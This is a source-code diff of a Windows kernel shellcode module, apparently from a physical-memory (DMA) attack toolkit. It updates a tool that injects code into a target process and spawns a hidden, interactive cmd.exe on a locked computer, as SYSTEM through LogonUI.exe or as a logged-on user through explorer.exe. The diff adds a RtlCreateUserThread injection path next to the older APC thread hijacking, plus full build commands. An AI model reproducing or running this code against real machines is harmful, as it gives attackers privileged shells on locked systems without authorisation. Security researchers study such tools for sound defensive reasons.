@@ -8,13 +8,19 @@
 // cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
 // cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_pscreate.c
 // ml64 wx64_common_a.asm /Fewx64_pscreate.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_pscreate.obj wx64_common.obj
-// shellcode64.exe -o wx64_pscreate.exe "PROCESS CREATOR - SPAWN NEW PROCESSES ON TARGET!               \n===============================================================\nREQUIRED OPTIONS:                                              \n  -s   : Executable path including command line options.       \n         Example: '-s c:\windows\system32\cmd.exe'.            \n  -0   : Parent process PID to start new process from.         \n         Example '-0 0x0fe0'.                                  \nOPTIONAL OPTIONS:                                              \n  -1   : CreateProcess creation flags (dwCreationFlags) as     \n         specified on MSDN. Hidden Window = 0x08000000         \n  -2   : Redirect input - use to spawn interactive shell.      \n         Example: 0x01                                         \n  -3   : Timeout in seconds. Default: 60.                      \n  -4   : Boost: higher success ratio, but parent process may   \n         crash. Example 1. Default 0.                          \n===== DETAILED INFORMATION AFTER PROCESS CREATION ATTEMPT =====%s\nNTSTATUS        : 0x%08X                                       \nADDITIONAL INFO : 0x%04X                                       \n===============================================================\n"
+// shellcode64.exe -o wx64_pscreate.exe "PROCESS CREATOR - SPAWN NEW PROCESSES ON TARGET!               \n===============================================================\nREQUIRED OPTIONS:                                              \n  -s   : Executable path including command line options.       \n         Example: '-s c:\windows\system32\cmd.exe'.            \n  -0   : Parent process PID to start new process from.         \n         Example '-0 0x0fe0'.                                  \nOPTIONAL OPTIONS:                                              \n  -1   : CreateProcess creation flags (dwCreationFlags) as     \n         specified on MSDN. Hidden Window = 0x08000000         \n  -2   : Redirect input - use to spawn interactive shell.      \n         Example: 0x01                                         \n  -3   : Timeout in seconds. Default: 60.                      \n  -4   : Boost (Windows 7 only): higher success ratio, but     \n         parent process may crash. Example 1. Default 0.       \n===== DETAILED INFORMATION AFTER PROCESS CREATION ATTEMPT =====%s\nNTSTATUS        : 0x%08X                                       \nADDITIONAL INFO : 0x%04X                                       \n===============================================================\n"
 //
 // ALTERNATIVELY (wx64_pscmd):
 // cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
-// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel /D_PSCMD wx64_pscreate.c
+// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel /D_PSCMD /D_PSCMD_SYSTEM wx64_pscreate.c
 // ml64 wx64_common_a.asm /Fewx64_pscmd.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_pscreate.obj wx64_common.obj
 // shellcode64.exe -o wx64_pscmd.exe "PROCESS CREATOR - AUTOMATICALLY SPAWN CMD.EXE ON TARGET!        \n================================================================\nAutomatically spawn a CMD.EXE on the target system. This utility\nonly work if the target system is locked and the login screen is\nvisible. If it takes time waiting - then please touch any key on\nthe target system.   If the utility fails multiple times, please\ntry wx64_pscreate instead.                                      \n===== DETAILED INFORMATION AFTER PROCESS CREATION ATTEMPT ======%s\nNTSTATUS        : 0x%08X                                        \nADDITIONAL INFO : 0x%04X                                        \n================================================================\n"
+//
+// ALTERNATIVELY (wx64_pscmd_user):
+// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
+// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel /D_PSCMD /D_PSCMD_USER wx64_pscreate.c
+// ml64 wx64_common_a.asm /Fewx64_pscmd_user.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_pscreate.obj wx64_common.obj
+// shellcode64.exe -o wx64_pscmd_user.exe "PROCESS CREATOR - AUTOMATICALLY SPAWN CMD.EXE AS USER ON TARGET!        \n================================================================\nAutomatically spawn a CMD.EXE on the target system. This utility\nwill spawn a cmd.exe in the context of a random logged on user.\nThis will work even though the computer may be locked. If this\nutility fails multiple times, please try wx64_pscreate instead.                                      \n===== DETAILED INFORMATION AFTER PROCESS CREATION ATTEMPT ======%s\nNTSTATUS        : 0x%08X                                        \nADDITIONAL INFO : 0x%04X                                        \n================================================================\n"
 #include "wx64_common.h"
 
 #define MAGIC_WAIT_WORD					0x01234123412341234
@@ -183,6 +189,18 @@ typedef struct tdKERNEL_FUNCTIONS2 {
 		_In_  HANDLE   ThreadId,
 		_Out_ PETHREAD *Thread
 		);
+	NTSTATUS(*RtlCreateUserThread)(
+		_In_ HANDLE ProcessHandle,
+		_In_ QWORD pSecurityDescriptor,
+		_In_ BOOLEAN fCreateSuspended,
+		_In_ QWORD StackZeroBits,
+		_In_ SIZE_T* StackReserved,
+		_In_ SIZE_T* StackCommit,
+		_In_ QWORD EntryPoint,
+		_In_ QWORD _opaque0,
+		_Out_ PHANDLE ThreadHandle,
+		_Out_ PCLIENT_ID ClientID
+		);
 	size_t(*strnlen)(
 		const char *str,
 		size_t numberOfElements
@@ -223,6 +241,7 @@ VOID InitializeKernelFunctions2(_In_ QWORD qwNtosBase, _Out_ PKERNEL_FUNCTIONS2 
 		{ &fnk2->PsGetProcessImageFileName,			H_PsGetProcessImageFileName },
 		{ &fnk2->PsLookupProcessByProcessId,		H_PsLookupProcessByProcessId },
 		{ &fnk2->PsLookupThreadByThreadId,			H_PsLookupThreadByThreadId },
+		{ &fnk2->RtlCreateUserThread,				H_RtlCreateUserThread },
 		{ &fnk2->strnlen,							H_strnlen },
 		{ &fnk2->ZwAllocateVirtualMemory,			H_ZwAllocateVirtualMemory },
 		{ &fnk2->ZwClose,							H_ZwClose },
@@ -384,6 +403,49 @@ NTSTATUS IntializeUserModeCode(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In
 }
 
 /*
+* Initialized a 2-page console buffer inside the user mode process used for
+* thread hi-jacking. The pages are allocated from the NoPagedPool. On success
+* the memory and the MDL object allocated will be "leaked". On exit the physical
+* memory location be written to dataOut[2], dataInConsoleBuffer and dataOutConsoleBuffer.
+* NB! needs to be run insode a KeStackAttachProcess section.
+*/
+QWORD SetupConsoleBufferUserMode(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2)
+{
+	PVOID pvMemory;
+	PVOID pMdl;
+	QWORD qwMemoryMapped;
+	// Allocate and Zero memory.
+	pvMemory = fnk->ExAllocatePool(0, 0x2000);
+	if(!pvMemory) {
+		return NULL;
+	}
+	fnk->RtlZeroMemory(pvMemory, 0x2000);
+	// Allocate MDL.
+	pMdl = fnk2->IoAllocateMdl(pvMemory, 0x2000, FALSE, FALSE, NULL);
+	if(!pMdl) {
+		fnk->ExFreePool(pvMemory);
+		return NULL;
+	}
+	fnk2->MmProbeAndLockPages(pMdl, KernelMode, IoModifyAccess);
+	// Map the memory into the target process.
+	qwMemoryMapped = fnk2->MmMapLockedPagesSpecifyCache(pMdl, UserMode, MmCached, NULL, FALSE, NormalPagePriority);
+	if(!qwMemoryMapped) {
+		fnk->ExFreePool(pvMemory);
+		return NULL;
+	}
+	// finish
+	pk->dataInConsoleBuffer = fnk->MmGetPhysicalAddress((PVOID)qwMemoryMapped);
+	pk->dataOutConsoleBuffer = fnk->MmGetPhysicalAddress((PVOID)(qwMemoryMapped + 0x1000));
+	pk->dataOut[2] = pvMemory;
+	pk->dataOut[3] = qwMemoryMapped;
+	return qwMemoryMapped;
+}
+
+//----------------------------------------------------------------------------------------------------------
+// Windows 7 APC ROUTINES BELOW (WORKAROUND FOR MISSING ntoskrnl!RtlCreateUserThread).
+//----------------------------------------------------------------------------------------------------------
+
+/*
 * The KernelApcRoutine is called after the user mode APC is completed. 
 */
 VOID KernelApcRoutine(_In_ struct _KAPC *Apc, _Inout_ PVOID *NormalRoutine, _Inout_ PVOID *NormalContext, _Inout_ PVOID *SystemArgument1, _Inout_ PVOID *SystemArgument2)
@@ -501,113 +563,14 @@ PETHREAD GetPEThread(_In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _
 	return NULL;
 }
 
-/*
-* Initialized a 2-page console buffer inside the user mode process used for
-* thread hi-jacking. The pages are allocated from the NoPagedPool. On success
-* the memory and the MDL object allocated will be "leaked". On exit the physical
-* memory location be written to dataOut[2], dataInConsoleBuffer and dataOutConsoleBuffer.
-* NB! needs to be run insode a KeStackAttachProcess section.
-*/
-QWORD SetupConsoleBufferUserMode(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2)
+VOID ActionDefault_QueueApcState(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, 
+	PEPROCESS Process, KAPC_STATE ApcState, PVOID pvAddressUserMode)
 {
-	PVOID pvMemory;
-	PVOID pMdl;
-	QWORD qwMemoryMapped;
-	// Allocate and Zero memory.
-	pvMemory = fnk->ExAllocatePool(0, 0x2000);
-	if(!pvMemory) {
-		return NULL;
-	}
-	fnk->RtlZeroMemory(pvMemory, 0x2000);
-	// Allocate MDL.
-	pMdl = fnk2->IoAllocateMdl(pvMemory, 0x2000, FALSE, FALSE, NULL);
-	if(!pMdl) {
-		fnk->ExFreePool(pvMemory);
-		return NULL;
-	}
-	fnk2->MmProbeAndLockPages(pMdl, KernelMode, IoModifyAccess);
-	// Map the memory into the target process.
-	qwMemoryMapped = fnk2->MmMapLockedPagesSpecifyCache(pMdl, UserMode, MmCached, NULL, FALSE, NormalPagePriority);
-	if(!qwMemoryMapped) {
-		fnk->ExFreePool(pvMemory);
-		return NULL;
-	}
-	// finish
-	pk->dataInConsoleBuffer = fnk->MmGetPhysicalAddress((PVOID)qwMemoryMapped);
-	pk->dataOutConsoleBuffer = fnk->MmGetPhysicalAddress((PVOID)(qwMemoryMapped + 0x1000));
-	pk->dataOut[2] = pvMemory;
-	pk->dataOut[3] = qwMemoryMapped;
-	return qwMemoryMapped;
-}
-
-/*
-* Module main control routine. Connects to the parent process memory and injects
-* user mode code into it. Queues an APC onto one of the parent process threads in
-* order to execute the injected code. The injected code creates the new process.
-*/
-VOID ActionDefault(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2)
-{
-	NTSTATUS nt;
-	OBJECT_ATTRIBUTES ObjectAttributes;
-	QWORD qwPID = pk->dataIn[0];
-	PEPROCESS Process = NULL;
+	DWORD i;
+	PKAPC pKApc = NULL;
 	PETHREAD Thread = NULL;
 	PKAPC_STATE Thread_ApcState = NULL;
-	PVOID pvAddressUserMode = NULL;
-	SIZE_T cbUserModeMemory = 0x1000;
-	QWORD qwAddrConsoleBuffer = 0;
-	HANDLE ZwProcessHandle;
-	KAPC_STATE ApcState;
-	CLIENT_ID ClientId;
-	PKAPC pKApc = NULL;
-	DWORD i;
-	// lookup process
-	nt = fnk2->PsLookupProcessByProcessId((HANDLE)qwPID, &Process); // TODO: decrease handle needed???
-	if(NT_ERROR(nt)) {
-		pk->dataOut[0] = nt;
-		pk->dataOut[1] = 0x01;
-		return;
-	}
-	// allocate memory
-	fnk->RtlZeroMemory(&ObjectAttributes, sizeof(OBJECT_ATTRIBUTES));
-	fnk->RtlZeroMemory(&ClientId, sizeof(CLIENT_ID));
-	ClientId.UniqueThread = 0;
-	ClientId.UniqueProcess = (HANDLE)qwPID;
-	nt = fnk2->ZwOpenProcess(&ZwProcessHandle, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
-	if(NT_ERROR(nt)) {
-		pk->dataOut[0] = nt;
-		pk->dataOut[1] = 0x04;
-		goto fail;
-	}
-	nt = fnk2->ZwAllocateVirtualMemory(ZwProcessHandle, &pvAddressUserMode, 1, &cbUserModeMemory, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	fnk2->ZwClose(ZwProcessHandle);
-	if(NT_ERROR(nt)) {
-		pk->dataOut[0] = nt;
-		pk->dataOut[1] = 0x05;
-		goto fail;
-	}
-	// Attach to user process memory
-	fnk2->KeStackAttachProcess(Process, &ApcState);
-	// Allocate memory for console buffer (if needed)
-	if(pk->dataIn[2]) {
-		qwAddrConsoleBuffer = SetupConsoleBufferUserMode(pk, fnk, fnk2);
-		if(!qwAddrConsoleBuffer) {
-			pk->dataOut[0] = (QWORD)E_FAIL;
-			pk->dataOut[1] = 0x06;
-			fnk2->KeUnstackDetachProcess(&ApcState);
-			goto fail;
-		}
-	}
-	// Intialize user mode code
-	nt = IntializeUserModeCode(pk, fnk, fnk2, (PBYTE)pvAddressUserMode, qwAddrConsoleBuffer);
-	if(NT_ERROR(nt)) {
-		pk->dataOut[0] = nt;
-		pk->dataOut[1] = 0x07;
-		fnk2->KeUnstackDetachProcess(&ApcState);
-		goto fail;
-	}
-	// Detach from user process memory
-	fnk2->KeUnstackDetachProcess(&ApcState);
+	QWORD qwPID = pk->dataIn[0];
 	// activate APC
 	i = 0;
 	do {
@@ -647,15 +610,95 @@ VOID ActionDefault(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FU
 	} while((++i < NUM_PARALELL_APC_THREADS) && pk->dataIn[4]);
 	// wait loop for magic wait word
 	ActionWaitForExit(pk, fnk);
-	fnk2->ObDereferenceObject(Process);
 	return;
 fail:
-	if(pKApc) {
-		fnk->ExFreePool(pKApc); 
+	if(pKApc) { fnk->ExFreePool(pKApc);	}
+}
+
+//----------------------------------------------------------------------------------------------------------
+// MAIN CODE BELOW:
+//----------------------------------------------------------------------------------------------------------
+
+/*
+* Module main control routine. Connects to the parent process memory and injects
+* user mode code into it. Tries to spawn a thread by using RtlCreateUserThread if
+* function is exported by ntoskrnl - if not (win7) a fallback onto more complicated
+* KeInsertQueueApc is used instead. The injected code then creates the new process.
+*/
+VOID ActionDefault(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2)
+{
+	NTSTATUS nt;
+	OBJECT_ATTRIBUTES ObjectAttributes;
+	QWORD qwPID = pk->dataIn[0];
+	PEPROCESS Process = NULL;
+	PVOID pvAddressUserMode = NULL;
+	SIZE_T cbUserModeMemory = 0x1000;
+	QWORD qwAddrConsoleBuffer = 0;
+	HANDLE ZwProcessHandle = NULL;
+	KAPC_STATE ApcState;
+	CLIENT_ID ClientId, ClientId_2;
+	HANDLE hThread;
+	// lookup process
+	nt = fnk2->PsLookupProcessByProcessId((HANDLE)qwPID, &Process); // TODO: decrease handle needed???
+	if(NT_ERROR(nt)) {
+		pk->dataOut[0] = nt;
+		pk->dataOut[1] = 0x01;
+		return;
 	}
-	if(Process) {
-		fnk2->ObDereferenceObject(Process);
+	// allocate memory
+	fnk->RtlZeroMemory(&ObjectAttributes, sizeof(OBJECT_ATTRIBUTES));
+	fnk->RtlZeroMemory(&ClientId, sizeof(CLIENT_ID));
+	ClientId.UniqueThread = 0;
+	ClientId.UniqueProcess = (HANDLE)qwPID;
+	nt = fnk2->ZwOpenProcess(&ZwProcessHandle, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
+	if(NT_ERROR(nt)) {
+		pk->dataOut[0] = nt;
+		pk->dataOut[1] = 0x04;
+		goto fail;
 	}
+	nt = fnk2->ZwAllocateVirtualMemory(ZwProcessHandle, &pvAddressUserMode, 1, &cbUserModeMemory, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if(NT_ERROR(nt)) {
+		pk->dataOut[0] = nt;
+		pk->dataOut[1] = 0x05;
+		goto fail;
+	}
+	// Attach to user process memory
+	fnk2->KeStackAttachProcess(Process, &ApcState);
+	// Allocate memory for console buffer (if needed)
+	if(pk->dataIn[2]) {
+		qwAddrConsoleBuffer = SetupConsoleBufferUserMode(pk, fnk, fnk2);
+		if(!qwAddrConsoleBuffer) {
+			pk->dataOut[0] = (QWORD)E_FAIL;
+			pk->dataOut[1] = 0x06;
+			fnk2->KeUnstackDetachProcess(&ApcState);
+			goto fail;
+		}
+	}
+	// Intialize user mode code
+	nt = IntializeUserModeCode(pk, fnk, fnk2, (PBYTE)pvAddressUserMode, qwAddrConsoleBuffer);
+	if(NT_ERROR(nt)) {
+		pk->dataOut[0] = nt;
+		pk->dataOut[1] = 0x07;
+		fnk2->KeUnstackDetachProcess(&ApcState);
+		goto fail;
+	}
+	// Detach from user process memory
+	fnk2->KeUnstackDetachProcess(&ApcState);
+	if(fnk2->RtlCreateUserThread) {
+		nt = fnk2->RtlCreateUserThread(ZwProcessHandle,	0, FALSE, 0, NULL, NULL, (QWORD)pvAddressUserMode, 0, &hThread, &ClientId_2);
+		if(NT_ERROR(nt)) { 
+			pk->dataOut[0] = nt;
+			pk->dataOut[1] = 0x0A;
+			goto fail;
+		}
+		CommonSleep(fnk, 250);
+	} else {
+		// Windows 7 fallback to more complicated KeInsertQueueApc method.
+		ActionDefault_QueueApcState(pk, fnk, fnk2, Process, ApcState, pvAddressUserMode);
+	}
+fail:
+	if(ZwProcessHandle) { fnk2->ZwClose(ZwProcessHandle); }
+	if(Process) { fnk2->ObDereferenceObject(Process); }
 }
 
 NTSTATUS GetProcessNameFromPid(_In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _In_ HANDLE pid, _In_ SIZE_T cb, _Out_ PBYTE pb)
@@ -717,13 +760,18 @@ VOID c_EntryPoint(_In_ PKMDDATA pk)
 	KERNEL_FUNCTIONS2 fnk2;
 	InitializeKernelFunctions(pk->AddrKernelBase, &fnk);
 	InitializeKernelFunctions2(pk->AddrKernelBase, &fnk2);
+#ifdef _PSCMD_SYSTEM
+	CHAR szBINARY[] = { 'L', 'o', 'g', 'o', 'n', 'U', 'I', '.', 'e', 'x', 'e', 0 };
+#endif _PSCMD_SYSTEM
+#ifdef _PSCMD_USER
+	CHAR szBINARY[] = { 'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e', 0 };
+#endif _PSCMD_USER
 #ifdef _PSCMD
-	CHAR szLOGONUI[] = { 'L', 'o', 'g', 'o', 'n', 'U', 'I', '.', 'e', 'x', 'e', 0 };
 	CHAR szCMD[] = { 'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'c', 'm', 'd', '.', 'e', 'x', 'e', 0 };
 	pk->dataIn[1] = 0x08000000; // hidden window
 	pk->dataIn[2] = 1; // interactive
 	pk->dataIn[4] = 1; // multi thread hijack (boost)
-	pk->dataOut[0] = GetPidFromPsName(&fnk, &fnk2, szLOGONUI, &pk->dataIn[0]);
+	pk->dataOut[0] = GetPidFromPsName(&fnk, &fnk2, szBINARY, &pk->dataIn[0]);
 	if(pk->dataOut[0]) {
 		pk->dataOut[1] = 0x101;
 		return;
